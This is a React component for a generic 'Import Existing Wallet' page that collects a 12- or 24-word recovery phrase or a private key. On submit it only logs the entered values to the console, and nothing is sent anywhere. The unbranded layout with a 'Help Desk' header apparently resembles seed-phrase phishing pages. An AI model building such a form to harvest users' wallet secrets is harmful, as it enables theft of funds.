import { useState, type FormEvent } from "react";

export default function Phrase() {
    const [activeType, setActiveType] = useState("phrase-12"); // phrase-12, phrase-24, phrase-key
    const [words, setWords] = useState(Array(24).fill(""));
    const [key, setKey] = useState("");
    const [hdPathVisible, setHdPathVisible] = useState(false);

    const handleWordChange = (index: number, value: string) => {
        const newWords = [...words];
        newWords[index] = value;
        setWords(newWords);
    };

    const handleSubmit = (e: FormEvent) => {
        e.preventDefault();
        if (activeType === "phrase-key") {
            console.log("Importing key:", key);
        } else {
            console.log("Importing words:", words.filter(Boolean));
        }
    };

    const wordCount = activeType === "phrase-12" ? 12 : 24;

    return (
        <div className="min-h-screen bg-gray-900 text-white p-6">
            {/* Help Desk */}
            <div className="flex justify-between items-center mb-6">
                <span>Help Desk</span>
                <svg width="36" height="36" viewBox="0 0 36 36" fill="none">
                    <circle cx="18" cy="18" r="18" fill="#2E2D32" />
                    {/* Другие пути... */}
                </svg>
            </div>

            {/* Back button */}
            <a href="/login" className="inline-flex items-center mb-4 text-gray-400 hover:text-white">
                <svg width="14" height="12" viewBox="0 0 14 12" fill="none">
                    <path d="M12.625 6H1.375M1.375 6L6.4375 11.0625M1.375 6L6.4375 0.9375" stroke="#ABABB5" strokeWidth="1.875" strokeLinecap="round" strokeLinejoin="round" />
                </svg>
                <span className="ml-2">Back</span>
            </a>

            <div className="mb-2 text-sm">Step 1/3</div>
            <h1 className="text-3xl font-bold mb-2">Import Existing Wallet</h1>
            <p className="mb-6 text-gray-300">
                • Enter your recovery phrase here to restore your wallet. Or click on any blank and paste the entire phrase.<br />
                • Enter the phrase in the right order without capitalization, punctuation symbols, or spaces.
            </p>

            {/* Switch */}
            <div className="flex gap-2 mb-4">
                {["phrase-12", "phrase-24", "phrase-key"].map((type) => (
                    <button
                        key={type}
                        onClick={() => setActiveType(type)}
                        className={`px-4 py-2 rounded ${activeType === type ? "bg-blue-600" : "bg-gray-700"}`}
                    >
                        {type === "phrase-12" ? "12 word" : type === "phrase-24" ? "24 word" : "Private key"}
                    </button>
                ))}
            </div>

            {/* Forms */}
            {activeType !== "phrase-key" ? (
                <form onSubmit={handleSubmit}>
                    <div className="grid grid-cols-2 sm:grid-cols-3 md:grid-cols-4 gap-2 mb-4">
                        {Array.from({ length: wordCount }).map((_, i) => (
                            <div key={i} className="flex items-center gap-2">
                                <div>{i + 1}.</div>
                                <input
                                    type="password"
                                    value={words[i]}
                                    onChange={(e) => handleWordChange(i, e.target.value)}
                                    className="flex-1 p-2 rounded bg-gray-800 text-white border border-gray-600"
                                    placeholder={`Word ${i + 1}`}
                                />
                            </div>
                        ))}
                    </div>
                    <button
                        type="button"
                        onClick={() => setHdPathVisible(!hdPathVisible)}
                        className="mb-4 px-4 py-2 bg-gray-700 rounded"
                    >
                        Set Derivation Path (Advanced)
                    </button>
                    <button
                        type="submit"
                        disabled={!words.slice(0, wordCount).every(Boolean)}
                        className="px-4 py-2 bg-blue-600 rounded disabled:opacity-50"
                    >
                        Import
                    </button>
                </form>
            ) : (
                <form onSubmit={handleSubmit}>
                    <input
                        type="text"
                        value={key}
                        onChange={(e) => setKey(e.target.value)}
                        className="mb-4 p-2 rounded bg-gray-800 text-white border border-gray-600 w-full"
                        placeholder="Enter Private Key"
                    />
                    <button type="submit" disabled={!key} className="px-4 py-2 bg-blue-600 rounded disabled:opacity-50">
                        Import
                    </button>
                </form>
            )}

            {/* HD Path Popup */}
            {hdPathVisible && (
                <div className="fixed inset-0 bg-black bg-opacity-70 flex justify-center items-center">
                    <div className="bg-gray-800 p-6 rounded w-full max-w-md relative">
                        <button
                            onClick={() => setHdPathVisible(false)}
                            className="absolute top-2 right-2 text-gray-400 hover:text-white"
                        >
                            ✕
                        </button>
                        <h2 className="text-xl font-bold mb-2">Set Custom Derivation Path</h2>
                        <p className="text-gray-300 mb-4">
                            • You can create multiple addresses from one recovery phrase<br />
                            • A lost path cannot be recovered<br />
                            • If you're unfamiliar with this feature, skip or undo this step - Reset Settings
                        </p>
                        <div className="flex gap-2 items-center">
                            <span>m/-'/-'/</span>
                            <input type="text" defaultValue="0" className="p-2 rounded bg-gray-700 border border-gray-600 w-16" />
                            <span>'/</span>
                            <input type="text" defaultValue="0" className="p-2 rounded bg-gray-700 border border-gray-600 w-16" />
                            <span>'/</span>
                            <input type="text" defaultValue="0" className="p-2 rounded bg-gray-700 border border-gray-600 w-16" />
                        </div>
                    </div>
                </div>
            )}
        </div>
    );
}